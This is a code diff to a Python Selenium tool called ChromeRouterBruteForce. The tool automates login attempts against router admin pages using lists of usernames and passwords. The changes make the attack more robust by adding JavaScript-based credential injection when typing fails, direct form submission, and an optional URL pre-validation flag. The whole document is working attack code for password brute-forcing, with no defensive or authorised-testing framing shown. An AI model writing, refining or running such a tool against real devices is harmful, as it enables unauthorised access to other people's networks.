@@ -175,7 +175,7 @@ class AdvancedWaitStrategies:
             return False
 
 class ChromeRouterBruteForce:
-    def __init__(self, login_urls, threads=1, timeout=10, headless=False, enable_screenshot=True):
+    def __init__(self, login_urls, threads=1, timeout=10, headless=False, enable_screenshot=True, enable_prevalidation=False):
         self.login_urls = list(set(login_urls))  # Remove duplicates
         self.threads = threads
         self.timeout = timeout
@@ -185,6 +185,7 @@ class ChromeRouterBruteForce:
         self.wait_strategies = AdvancedWaitStrategies()
         self.session = requests.Session()
         self.setup_session()
+        self.enable_prevalidation = enable_prevalidation
     
     def setup_session(self):
         """Setup requests session with retry strategy"""
@@ -678,8 +679,12 @@ class ChromeRouterBruteForce:
                     # If click fails, try JavaScript
                     driver.execute_script("arguments[0].click(); arguments[0].value = '';", username_field)
                 
-                # Type username
-                username_field.send_keys(username)
+                # Type username (try real typing, then JS events)
+                try:
+                    username_field.send_keys(username)
+                except Exception:
+                    driver.execute_script("arguments[0].focus(); arguments[0].value='';", username_field)
+                    driver.execute_script("arguments[0].value=arguments[1]; arguments[0].dispatchEvent(new Event('input', {bubbles:true})); arguments[0].dispatchEvent(new Event('change', {bubbles:true}));", username_field, username)
                 time.sleep(0.5)
                 
                 # Scroll to password field
@@ -694,8 +699,12 @@ class ChromeRouterBruteForce:
                     # If click fails, try JavaScript
                     driver.execute_script("arguments[0].click(); arguments[0].value = '';", password_field)
                 
-                # Type password
-                password_field.send_keys(password)
+                # Type password (try real typing, then JS events)
+                try:
+                    password_field.send_keys(password)
+                except Exception:
+                    driver.execute_script("arguments[0].focus(); arguments[0].value='';", password_field)
+                    driver.execute_script("arguments[0].value=arguments[1]; arguments[0].dispatchEvent(new Event('input', {bubbles:true})); arguments[0].dispatchEvent(new Event('change', {bubbles:true}));", password_field, password)
                 time.sleep(0.5)
                 
             except Exception as e:
@@ -753,8 +762,13 @@ class ChromeRouterBruteForce:
                     except Exception:
                         driver.execute_script("arguments[0].click();", submit_button)
                 else:
-                    # Try pressing Enter on password field
-                    password_field.send_keys("\n")
+                    # Try submitting the containing form directly
+                    try:
+                        form = submit_button.find_element(By.XPATH, "ancestor::form") if submit_button else password_field.find_element(By.XPATH, "ancestor::form")
+                        driver.execute_script("arguments[0].submit();", form)
+                    except Exception:
+                        # Fallback: press Enter on password field
+                        password_field.send_keys("\n")
             except Exception as e:
                 print(f"{Colors.YELLOW}[-] Error clicking submit: {e}{Colors.END}")
                 return False, None
@@ -909,13 +923,14 @@ class ChromeRouterBruteForce:
         try:
             print(f"{Colors.CYAN}[>] Testing: {username}:{password}{Colors.END}")
             
-            # Pre-validate URL before Chrome automation (non-blocking)
-            try:
-                pre_ok = self.pre_validate_url(url)
-                if not pre_ok:
-                    print(f"{Colors.YELLOW}[-] URL pre-validation reported issues, continuing with Chrome for verification...{Colors.END}")
-            except Exception as _pre_err:
-                print(f"{Colors.YELLOW}[-] URL pre-validation error: {_pre_err}. Continuing...{Colors.END}")
+            # Optional Pre-validate URL before Chrome automation (non-blocking)
+            if self.enable_prevalidation:
+                try:
+                    pre_ok = self.pre_validate_url(url)
+                    if not pre_ok:
+                        print(f"{Colors.YELLOW}[-] URL pre-validation reported issues, continuing with Chrome for verification...{Colors.END}")
+                except Exception as _pre_err:
+                    print(f"{Colors.YELLOW}[-] URL pre-validation error: {_pre_err}. Continuing...{Colors.END}")
             
             # Create Chrome driver
             driver = self.create_chrome_driver()
